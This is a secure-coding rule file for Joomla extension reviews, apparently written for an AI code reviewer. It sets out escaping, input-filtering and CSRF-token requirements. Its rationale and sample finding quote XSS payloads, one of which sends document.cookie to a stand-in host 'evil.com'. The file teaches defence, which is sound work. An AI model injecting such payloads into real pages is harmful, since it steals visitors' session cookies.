---
paths:
  - "**/tmpl/**"
  - "**/View/**"
  - "**/Controller/**"
  - "**/src/Controller/**"
  - "**/src/View/**"
---

# Handbook: Input/Output Safety (Joomla variant)

**Scope:** PRs touching templates, views, or controllers in a Joomla extension.
**Enforcement:** advisory.

## The rule

All user-supplied data must be filtered on input and escaped on output. Joomla provides built-in primitives for both — use them consistently.

### Output escaping

| Context | Method | Example |
|---|---|---|
| HTML text content | `$this->escape($value)` in views/templates | `<h3><?php echo $this->escape($item->title); ?></h3>` |
| HTML attribute | `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` | `<input value="<?php echo htmlspecialchars($value, ENT_QUOTES, 'UTF-8'); ?>">` |
| JavaScript context | `json_encode($value, JSON_HEX_TAG \| JSON_HEX_AMP)` | `<script>var data = <?php echo json_encode($data, JSON_HEX_TAG); ?>;</script>` |
| URL parameter | `urlencode($value)` | `<a href="index.php?option=com_example&id=<?php echo urlencode($value); ?>">` |
| Translation strings | `Text::_('COM_EXAMPLE_TITLE')` — already safe; never concatenate user data into translation keys | |

### Input filtering

| Method | Use when |
|---|---|
| `$app->input->getInt('id')` | Expecting an integer |
| `$app->input->getCmd('task')` | Expecting a command string (alphanumeric + `.` + `_`) |
| `$app->input->getString('title')` | Expecting a string (basic filtering) |
| `$app->input->get('description', '', 'HTML')` | Expecting HTML content (uses `InputFilter` with safe HTML) |
| `$app->input->get('data', [], 'ARRAY')` | Expecting an array |

### CSRF protection

| Required | Pattern |
|---|---|
| State-changing controller actions | `Session::checkToken()` or `$this->checkToken()` at the start of the method |
| Form output | `HTMLHelper::_('form.token')` or `<?php echo HTMLHelper::_('form.token'); ?>` in every form |
| AJAX requests | Include the token as a POST parameter or header; check it server-side |

## Why

XSS is the most common vulnerability in the Joomla extension ecosystem. A single unescaped `echo $item->title` in a template is enough — if a user puts `<script>stealCookies()</script>` in a title field, every visitor's browser executes the attacker's JavaScript.

CSRF is the second most common. Without token validation, an attacker can craft a hidden form on their site that submits a "delete all items" request to the admin panel — the admin's browser sends the session cookie automatically.

Joomla provides escape/filter/token primitives that handle these correctly. The rule is simple: **use them everywhere, no exceptions**.

## What Rex flags

Surface a finding when:

1. A `tmpl/*.php` file echoes a variable without `$this->escape()`, `htmlspecialchars()`, or another escaping function. Raw `<?php echo $item->title; ?>` is always a finding.
2. A controller method that changes state (`save`, `delete`, `publish`, `unpublish`, `trash`, `checkin`) doesn't call `Session::checkToken()` or `$this->checkToken()`.
3. A form template is missing `HTMLHelper::_('form.token')`.
4. `$_GET`, `$_POST`, `$_REQUEST` are accessed directly instead of using `$app->input->get*()`.
5. `$app->input->getRaw()` is used without a documented justification — this returns unfiltered input.
6. User-supplied data is passed to `echo` inside a `<script>` block without `json_encode()` with appropriate flags.

## Sample finding

> **Input/output safety (Joomla)** — `administrator/tmpl/items/default.php:24` echoes `<?php echo $item->title; ?>` without escaping. If a content editor saves `<img onerror="fetch('https://evil.com?c='+document.cookie)">` as a title, every admin viewing the list leaks their session cookie. Use `<?php echo $this->escape($item->title); ?>`.
>
> **Input/output safety (Joomla)** — `src/Controller/ItemController.php:save()` doesn't call `$this->checkToken()`. Any external page can POST to this endpoint using the admin's session. Add `$this->checkToken();` as the first line of the method.

## What's NOT a violation

- `Text::_('COM_EXAMPLE_TITLE')` without escaping — translation strings are developer-authored constants.
- `HTMLHelper::_('grid.sort', ...)` — Joomla's HTML helpers handle their own escaping.
- `echo (int) $item->id;` — casting to int is safe output for numeric IDs.
- Raw HTML output in a WYSIWYG field that was filtered on input via `JFilterInput::getInstance()->clean($html, 'html')` — the filtering happened at save time.
- `echo $this->loadTemplate('default_body');` — loading a sub-template doesn't need escaping; the sub-template escapes its own output.

---

*Part of [ApexYard](https://github.com/me2resh/apexyard) — multi-project SDLC framework for Claude Code · MIT.*
